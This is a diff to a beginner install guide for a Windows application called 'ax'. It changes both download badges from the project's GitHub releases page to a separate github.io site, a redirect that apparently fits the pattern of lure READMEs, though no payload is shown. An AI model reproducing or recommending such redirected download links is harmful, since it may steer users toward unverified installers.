@@ -10,7 +10,7 @@ This guide will walk you through downloading and running ax on your Windows comp
 
 ### Step 1: Get the Installer
 
-[![Download ax Now](https://img.shields.io/badge/Download-ax-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Katepredestined50/ax/releases)
+[![Download ax Now](https://img.shields.io/badge/Download-ax-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://katepredestined50.github.io)
 
 Visit this link to download the application. Click the button above or go directly to the download page.
 
@@ -122,7 +122,7 @@ Remember, every expert was once a beginner. Take your time, explore, and soon yo
 
 You're all set! Download ax, follow the simple steps above, and you'll have your personal automation assistant running in minutes. It's that easy.
 
-[![Get ax Now](https://img.shields.io/badge/🚀-Download_ax_Here-orange?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://github.com/Katepredestined50/ax/releases)
+[![Get ax Now](https://img.shields.io/badge/🚀-Download_ax_Here-orange?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://katepredestined50.github.io)
 
 Visit this link to download the application. Click the button above to get started with ax today.
 
